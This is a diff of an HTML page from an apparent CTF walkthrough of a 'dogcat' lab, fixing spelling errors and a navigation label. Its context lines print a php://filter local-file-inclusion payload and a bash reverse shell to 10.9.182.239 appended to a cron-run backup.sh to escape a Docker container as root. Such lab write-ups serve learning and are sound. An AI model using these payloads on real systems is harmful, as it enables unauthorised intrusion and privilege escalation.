@@ -2825,7 +2825,7 @@
   
     <li class="md-nav__item">
       <a href="../../links/" class="md-nav__link">
-        Hack Challenges
+        Hack CTF Overview
       </a>
     </li>
   
@@ -4694,7 +4694,7 @@ Warning: include(): Failed opening &#39;somethingwithdog.php&#39; for inclusion 
 </code></pre></div>
 <p>This fails with the same error as above. So it seems we can only view ".php" files...</p>
 <h3 id="log-poisoning">Log Poisoning</h3>
-<p>Based on how we can manipulate the view paramenter, this page may be vulnerable to <a href="https://blog.sqreen.com/local-file-inclusions-explained/">Local File Inclusion</a>.</p>
+<p>Based on how we can manipulate the view parameter, this page may be vulnerable to <a href="https://blog.sqreen.com/local-file-inclusions-explained/">Local File Inclusion</a>.</p>
 <p>With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
 With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php</p>
 <div class="highlight"><pre><span></span><code>?view=php://filter/convert.base64-encode/resource=./cat/../index
@@ -4821,7 +4821,7 @@ See if proc/self/cgroup contains "docker" or "lxc": <code>grep 'docker\|lxc' /pr
 <p>or search for newest files</p>
 <div class="highlight"><pre><span></span><code>find / -type d <span class="se">\(</span> -name sys -o -name proc <span class="se">\)</span> -prune -o -name <span class="s2">&quot;*&quot;</span>  -mtime -0.02 -print
 </code></pre></div>
-<p>We find that "backup.tar" was last udpated and it is updated every minute!
+<p>We find that "backup.tar" was last updated and it is updated every minute!
 It seems as if the backup is created using the shell script in the same folder.</p>
 <p>This looks promising: We are root in a container that hosts the dogcat website and there is a script triggered from outside of the container running the "backup.sh" script (that we are able to edit) every minute.</p>
 <p>Let's try to exploit the backup.sh with a bash reverse shell:</p>
@@ -4831,7 +4831,7 @@ It seems as if the backup is created using the shell script in the same folder.<
 <p>Then append the bash reverse shell to the backup script:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;bash -i &gt;&amp; /dev/tcp/10.9.182.239/7777 0&gt;&amp;1&quot;</span> &gt;&gt; backup.sh
 </code></pre></div>
-<p>After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system.</p>
+<p>After waiting at most 59 seconds the backup job will trigger, run our modified script and we get another shell from the container host system.</p>
 <p>Running <code>whoami</code> we can see that we are root - whoop whoop!</p>
 <p>Let's search for flag 4:</p>
 <div class="highlight"><pre><span></span><code>find / -type f -iname <span class="s2">&quot;flag*&quot;</span>
